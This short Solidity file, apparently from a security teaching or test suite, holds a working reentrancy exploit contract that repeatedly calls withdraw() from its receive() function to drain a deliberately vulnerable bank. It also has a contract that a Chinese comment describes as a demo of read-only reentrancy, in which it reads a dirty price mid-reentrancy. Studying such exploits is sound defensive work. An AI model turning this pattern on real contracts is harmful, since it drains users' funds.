// SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import {VulnerableBank, VulnerableLP} from "../vulnerable/Reentrancy.sol";

contract ReentrancyAttacker {
    VulnerableBank public immutable bank;
    uint256 public constant CHUNK = 1 ether;

    constructor(VulnerableBank _bank) payable {
        bank = _bank;
    }

    function pwn() external payable {
        bank.deposit{value: CHUNK}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= CHUNK) {
            bank.withdraw();
        }
    }
}

/// @notice 演示 read-only reentrancy：在重入半途让外部 oracle 读到脏价格。
contract DirtyPriceConsumer {
    VulnerableLP public immutable lp;
    uint256 public observedPrice;

    constructor(VulnerableLP _lp) {
        lp = _lp;
    }

    function snapshot() external {
        observedPrice = lp.pricePerShare();
    }
}
